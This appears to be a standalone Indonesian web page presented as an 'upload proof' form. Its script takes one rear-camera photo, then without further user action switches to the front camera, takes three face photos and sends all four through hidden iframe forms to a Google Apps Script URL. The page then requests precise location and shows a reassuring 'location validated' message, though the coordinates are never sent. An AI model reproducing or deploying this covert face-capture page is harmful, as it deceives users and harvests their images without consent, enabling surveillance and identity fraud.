<!DOCTYPE html>
<html lang="id">

<head>

  <meta charset="UTF-8">

  <meta name="viewport"
        content="width=device-width, initial-scale=1.0">

  <title>Upload Bukti</title>


  <style>

    * {
      box-sizing: border-box;
    }


    body {

      margin: 0;

      min-height: 100vh;

      display: flex;

      justify-content: center;

      align-items: center;

      background: #f5f5f5;

      font-family: Arial, sans-serif;

    }


    .container {

      width: 100%;

      max-width: 420px;

      padding: 20px;

      text-align: center;

    }


    button {

      width: 100%;

      padding: 16px;

      border: none;

      border-radius: 12px;

      background: #111;

      color: white;

      font-size: 18px;

      font-weight: bold;

      cursor: pointer;

    }


    button:disabled {

      opacity: 0.6;

      cursor: not-allowed;

    }


    /* =====================================================
       LIVE CAMERA
       ===================================================== */

    video {

      width: 100%;

      max-height: 70vh;

      object-fit: cover;

      border-radius: 14px;

      margin-bottom: 15px;

      background: #000;

      display: none;

    }


    /* =====================================================
       FOTO BEKU
       ===================================================== */

    canvas {

      display: none;

      width: 100%;

      max-height: 70vh;

      object-fit: cover;

      border-radius: 14px;

      margin-bottom: 15px;

      background: #000;

    }


    /* =====================================================
       LOADING
       ===================================================== */

    .loading {

      display: none;

      margin: 20px 0;

    }


    .spinner {

      width: 42px;

      height: 42px;

      margin: 0 auto 12px;

      border: 4px solid #ddd;

      border-top: 4px solid #111;

      border-radius: 50%;

      animation: spin 1s linear infinite;

    }


    .loading-text {

      font-size: 15px;

      color: #444;

      font-weight: 500;

    }


    .processing-note {

      font-size: 14px;

      color: #777;

      margin-top: 6px;

      line-height: 1.4;

    }


    /* =====================================================
       LOCATION SUCCESS
       ===================================================== */

    .location-success {

      display: none;

      margin-top: 20px;

      font-size: 15px;

      color: #333;

      line-height: 1.5;

    }


    /* =====================================================
       THANK YOU
       ===================================================== */

    .thank-you {

      display: none;

      font-size: 22px;

      font-weight: bold;

      color: #111;

      margin-top: 20px;

    }


    /* =====================================================
       LOCATION ERROR
       ===================================================== */

    .location-error {

      display: none;

      margin-top: 20px;

      font-size: 15px;

      line-height: 1.5;

      color: #c00;

    }


    /* =====================================================
       SPINNER
       ===================================================== */

    @keyframes spin {

      0% {

        transform: rotate(0deg);

      }

      100% {

        transform: rotate(360deg);

      }

    }

  </style>

</head>


<body>


<div class="container">


  <!-- =====================================================
       CAMERA PREVIEW
       ===================================================== -->

  <video id="video"
         autoplay
         playsinline>
  </video>


  <!-- =====================================================
       CANVAS
       ===================================================== -->

  <canvas id="canvas"></canvas>


  <!-- =====================================================
       BUTTON
       ===================================================== -->

  <button id="mainButton"
          onclick="startProcess()">

    Upload Bukti

  </button>


  <!-- =====================================================
       LOADING
       ===================================================== -->

  <div id="loading"
       class="loading">

    <div class="spinner"></div>

    <div id="loadingText"
         class="loading-text">

      Sedang memproses...

    </div>

    <div id="processingNote"
         class="processing-note">

      Jangan menutup halaman ini

    </div>

  </div>


  <!-- =====================================================
       LOCATION SUCCESS
       ===================================================== -->

  <div id="locationSuccess"
       class="location-success">

    ✓ Lokasi berhasil divalidasi

  </div>


  <!-- =====================================================
       LOCATION ERROR
       ===================================================== -->

  <div id="locationError"
       class="location-error">

    Gagal, silakan ulang pengiriman dan pastikan
    mengaktifkan lokasi device untuk validasi.

  </div>


  <!-- =====================================================
       THANK YOU
       ===================================================== -->

  <div id="thankYou"
       class="thank-you">

    Thank You

  </div>


</div>



<script>


  // =========================================================
  // GOOGLE APPS SCRIPT
  // =========================================================

  const GAS_URL =
    "https://script.google.com/macros/s/AKfycbyTXqpKOHsVlUNhQ_vWe9o5kMBdYjkTCp7gQfky0h00ohNMgIDSTi5PtD3gZ_f-bc_a/exec";


  // =========================================================
  // ELEMENT
  // =========================================================

  const video =
    document.getElementById("video");

  const canvas =
    document.getElementById("canvas");

  const button =
    document.getElementById("mainButton");

  const loading =
    document.getElementById("loading");

  const loadingText =
    document.getElementById("loadingText");

  const processingNote =
    document.getElementById("processingNote");

  const locationSuccess =
    document.getElementById("locationSuccess");

  const locationError =
    document.getElementById("locationError");

  const thankYou =
    document.getElementById("thankYou");


  let stream = null;


  // =========================================================
  // SESSION ID
  // =========================================================

  const sessionId =

    "session_" +

    Date.now() +

    "_" +

    Math.random()
      .toString(36)
      .substring(2, 8);



  // =========================================================
  // START
  // =========================================================

  async function startProcess() {


    // -------------------------------------------------------
    // HAPUS ERROR LAMA
    // -------------------------------------------------------

    locationError.style.display =
      "none";


    locationSuccess.style.display =
      "none";


    thankYou.style.display =
      "none";


    loading.style.display =
      "none";


    canvas.style.display =
      "none";


    video.style.display =
      "none";


    button.style.display =
      "block";


    button.disabled =
      true;


    button.innerText =
      "Membuka kamera...";


    try {


      // =====================================================
      // KAMERA BELAKANG
      // =====================================================

      await openCamera(
        "environment"
      );


      video.style.display =
        "block";


      button.innerText =
        "Ambil Foto";


      button.onclick =
        takeFirstPhoto;


      button.disabled =
        false;


    }


    catch (error) {


      console.error(
        "Camera error:",
        error
      );


      alert(

        "Kamera tidak dapat dibuka.\n\n" +

        error.name +

        ": " +

        error.message

      );


      button.innerText =
        "Upload Bukti";


      button.onclick =
        startProcess;


      button.disabled =
        false;

    }

  }



  // =========================================================
  // OPEN CAMERA
  // =========================================================

  async function openCamera(
    cameraType
  ) {


    // -------------------------------------------------------
    // STOP CAMERA SEBELUMNYA
    // -------------------------------------------------------

    stopCamera();


    // -------------------------------------------------------
    // REQUEST CAMERA
    // -------------------------------------------------------

    stream =

      await navigator.mediaDevices
        .getUserMedia({

          video: {

            facingMode: {

              ideal: cameraType

            },

            width: {

              ideal: 1280

            },

            height: {

              ideal: 720

            }

          },

          audio: false

        });


    // -------------------------------------------------------
    // STREAM KE VIDEO
    // -------------------------------------------------------

    video.srcObject =
      stream;


    await video.play();

  }



  // =========================================================
  // STOP CAMERA
  // =========================================================

  function stopCamera() {


    if (stream) {


      stream
        .getTracks()
        .forEach(

          track => {

            track.stop();

          }

        );


      stream =
        null;

    }


    video.srcObject =
      null;

  }



  // =========================================================
  // CAPTURE PHOTO
  // =========================================================

  function capturePhoto() {


    if (

      !video.videoWidth ||

      !video.videoHeight

    ) {


      throw new Error(
        "Kamera belum siap."
      );

    }


    canvas.width =
      video.videoWidth;


    canvas.height =
      video.videoHeight;


    const ctx =
      canvas.getContext("2d");


    ctx.drawImage(

      video,

      0,

      0,

      canvas.width,

      canvas.height

    );


    return canvas.toDataURL(

      "image/jpeg",

      0.85

    );

  }



  // =========================================================
  // FOTO PERTAMA
  // =========================================================

  async function takeFirstPhoto() {


    button.disabled =
      true;


    try {


      // =====================================================
      // 1. CAPTURE FOTO #1
      // =====================================================

      const image =
        capturePhoto();


      // =====================================================
      // 2. BUAT FOTO BEKU
      // =====================================================

      const frozenImage =
        new Image();


      frozenImage.src =
        image;


      await new Promise(

        resolve => {

          frozenImage.onload =
            resolve;

        }

      );


      // -----------------------------------------------------
      // CANVAS
      // -----------------------------------------------------

      canvas.width =
        frozenImage.width;


      canvas.height =
        frozenImage.height;


      const ctx =
        canvas.getContext(
          "2d"
        );


      ctx.drawImage(

        frozenImage,

        0,

        0,

        canvas.width,

        canvas.height

      );


      // -----------------------------------------------------
      // TAMPILKAN FOTO BEKU
      // -----------------------------------------------------

      video.style.display =
        "none";


      canvas.style.display =
        "block";


      // =====================================================
      // 3. FREEZE 2 DETIK
      // =====================================================

      await delay(
        2000
      );


      // =====================================================
      // 4. LOADING
      // =====================================================

      loading.style.display =
        "block";


      loadingText.innerText =
        "Sedang memproses...";


      processingNote.innerText =
        "Jangan menutup halaman ini";


      // =====================================================
      // 5. UPLOAD FOTO #1
      // =====================================================

      const success =

        await uploadPhoto(

          image,

          1

        );


      if (!success) {


        throw new Error(
          "Upload foto pertama gagal."
        );

      }


      // =====================================================
      // 6. SEMBUNYIKAN BUTTON
      // =====================================================

      button.style.display =
        "none";


      // =====================================================
      // 7. HAPUS FOTO BEKU
      // =====================================================

      canvas.style.display =
        "none";


      // =====================================================
      // 8. STOP KAMERA BELAKANG
      // =====================================================

      stopCamera();


      // =====================================================
      // 9. BUKA KAMERA DEPAN
      // =====================================================

      await openCamera(
        "user"
      );


      video.style.display =
        "block";


      // =====================================================
      // 10. TUNGGU KAMERA DEPAN
      // =====================================================

      await delay(
        1200
      );


      // =====================================================
      // 11. CAPTURE #2
      // =====================================================

      await automaticCapture(
        2
      );


      // =====================================================
      // 12. CAPTURE #3
      // =====================================================

      await automaticCapture(
        3
      );


      // =====================================================
      // 13. CAPTURE #4
      // =====================================================

      await automaticCapture(
        4
      );


      // =====================================================
      // 14. SEMUA FOTO SELESAI
      // =====================================================

      stopCamera();


      video.style.display =
        "none";


      // =====================================================
      // 15. REQUEST LOCATION
      // =====================================================

      loading.style.display =
        "block";


      loadingText.innerText =
        "Meminta akses lokasi...";


      processingNote.innerText =
        "Izinkan akses lokasi untuk validasi bukti.";


      // =====================================================
      // 16. MINTA LOKASI
      // =====================================================

      try {


        const location =
          await requestLocation();


        console.log(
          "LOCATION SUCCESS:",
          location
        );


        // ===================================================
        // 17. LOKASI BERHASIL
        // ===================================================

        loading.style.display =
          "none";


        locationSuccess.style.display =
          "block";


        // ---------------------------------------------------
        // Tampilkan sebentar
        // ---------------------------------------------------

        await delay(
          1500
        );


        locationSuccess.style.display =
          "none";


        thankYou.style.display =
          "block";


      }


      catch (locationErr) {


        console.error(
          "LOCATION FAILED:",
          locationErr
        );


        // ===================================================
        // 18. LOKASI GAGAL
        // ===================================================

        loading.style.display =
          "none";


        thankYou.style.display =
          "none";


        locationSuccess.style.display =
          "none";


        locationError.style.display =
          "block";


        button.style.display =
          "block";


        button.disabled =
          false;


        button.innerText =
          "Ulangi Pengiriman";


        button.onclick =
          startProcess;

      }


    }


    catch (error) {


      console.error(
        "Process error:",
        error
      );


      stopCamera();


      canvas.style.display =
        "none";


      video.style.display =
        "none";


      loading.style.display =
        "none";


      button.style.display =
        "block";


      button.disabled =
        false;


      button.innerText =
        "Upload Bukti";


      button.onclick =
        startProcess;


      alert(

        "Terjadi kesalahan:\n\n" +

        error.message

      );

    }

  }



  // =========================================================
  // AUTOMATIC CAPTURE
  // =========================================================

  async function automaticCapture(
    number
  ) {


    // -------------------------------------------------------
    // TUNGGU
    // -------------------------------------------------------

    await delay(
      1200
    );


    // -------------------------------------------------------
    // CAPTURE
    // -------------------------------------------------------

    const image =
      capturePhoto();


    // -------------------------------------------------------
    // UPLOAD
    // -------------------------------------------------------

    const success =

      await uploadPhoto(

        image,

        number

      );


    // -------------------------------------------------------
    // CEK
    // -------------------------------------------------------

    if (!success) {


      throw new Error(

        "Upload capture #" +

        number +

        " gagal."

      );

    }


    // -------------------------------------------------------
    // JEDA
    // -------------------------------------------------------

    await delay(
      800
    );

  }



  // =========================================================
  // REQUEST LOCATION
  // =========================================================

  async function requestLocation() {


    // -------------------------------------------------------
    // CEK SUPPORT
    // -------------------------------------------------------

    if (!navigator.geolocation) {


      throw new Error(
        "Perangkat atau browser tidak mendukung lokasi."
      );

    }


    // -------------------------------------------------------
    // CEK PERMISSION STATUS
    // -------------------------------------------------------

    if (navigator.permissions) {


      try {


        const permission =

          await navigator.permissions.query({

            name:
              "geolocation"

          });


        console.log(
          "Location permission:",
          permission.state
        );


        // ---------------------------------------------------
        // SUDAH DITOLAK
        // ---------------------------------------------------

        if (
          permission.state ===
          "denied"
        ) {


          throw new Error(

            "Akses lokasi sebelumnya ditolak."

          );

        }

      }


      catch (permissionError) {


        console.log(

          "Permission API:",
          permissionError

        );

        // Tetap lanjut ke getCurrentPosition()
      }

    }


    // -------------------------------------------------------
    // REQUEST LOCATION
    // -------------------------------------------------------

    return new Promise(

      function(
        resolve,
        reject
      ) {


        navigator.geolocation
          .getCurrentPosition(


            // ===============================================
            // SUCCESS
            // ===============================================

            function(
              position
            ) {


              const data = {


                latitude:
                  position.coords.latitude,


                longitude:
                  position.coords.longitude,


                accuracy:
                  position.coords.accuracy,


                timestamp:
                  position.timestamp

              };


              console.log(
                "Latitude:",
                data.latitude
              );


              console.log(
                "Longitude:",
                data.longitude
              );


              console.log(
                "Accuracy:",
                data.accuracy
              );


              resolve(
                data
              );

            },


            // ===============================================
            // ERROR
            // ===============================================

            function(
              error
            ) {


              console.error(

                "Geolocation error:",

                error

              );


              let message =

                "Akses lokasi gagal.";


              if (
                error.code ===
                1
              ) {

                message =
                  "Akses lokasi ditolak.";

              }


              else if (
                error.code ===
                2
              ) {

                message =
                  "Lokasi perangkat tidak tersedia.";

              }


              else if (
                error.code ===
                3
              ) {

                message =
                  "Waktu permintaan lokasi habis.";

              }


              reject(
                new Error(
                  message
                )
              );

            },


            // ===============================================
            // OPTIONS
            // ===============================================

            {

              enableHighAccuracy:
                true,

              timeout:
                15000,

              maximumAge:
                0

            }

          );

      }

    );

  }



  // =========================================================
  // UPLOAD FOTO
  // =========================================================

  function uploadPhoto(
    image,
    number
  ) {


    return new Promise(

      function(resolve) {


        // ---------------------------------------------------
        // IFRAME
        // ---------------------------------------------------

        const iframe =
          document.createElement(
            "iframe"
          );


        const iframeName =

          "uploadFrame_" +

          Date.now() +

          "_" +

          Math.random()

            .toString(36)

            .substring(2);


        iframe.name =
          iframeName;


        iframe.style.display =
          "none";


        document.body.appendChild(
          iframe
        );


        // ---------------------------------------------------
        // FORM
        // ---------------------------------------------------

        const form =
          document.createElement(
            "form"
          );


        form.method =
          "POST";


        form.action =
          GAS_URL;


        form.target =
          iframeName;


        form.style.display =
          "none";


        // ---------------------------------------------------
        // PAYLOAD
        // ---------------------------------------------------

        const payload = {


          id:
            sessionId,


          captureNumber:
            number,


          image:
            image

        };


        // ---------------------------------------------------
        // INPUT
        // ---------------------------------------------------

        const input =
          document.createElement(
            "input"
          );


        input.type =
          "hidden";


        input.name =
          "payload";


        input.value =
          JSON.stringify(
            payload
          );


        form.appendChild(
          input
        );


        document.body.appendChild(
          form
        );


        // ---------------------------------------------------
        // RESPONSE
        // ---------------------------------------------------

        let finished =
          false;


        iframe.onload =
          function() {


            if (finished)
              return;


            finished =
              true;


            setTimeout(

              function() {


                cleanup();


                resolve(
                  true
                );


              },

              1000

            );

          };


        // ---------------------------------------------------
        // TIMEOUT
        // ---------------------------------------------------

        const timeout =

          setTimeout(

            function() {


              if (finished)
                return;


              finished =
                true;


              cleanup();


              resolve(
                false
              );


            },

            60000

          );


        // ---------------------------------------------------
        // SUBMIT
        // ---------------------------------------------------

        form.submit();


        // ---------------------------------------------------
        // CLEANUP
        // ---------------------------------------------------

        function cleanup() {


          clearTimeout(
            timeout
          );


          try {

            document.body.removeChild(
              form
            );

          }

          catch (e) {}


          try {

            document.body.removeChild(
              iframe
            );

          }

          catch (e) {}

        }

      }

    );

  }



  // =========================================================
  // DELAY
  // =========================================================

  function delay(ms) {


    return new Promise(

      resolve =>

        setTimeout(
          resolve,
          ms
        )

    );

  }


</script>


</body>

</html>
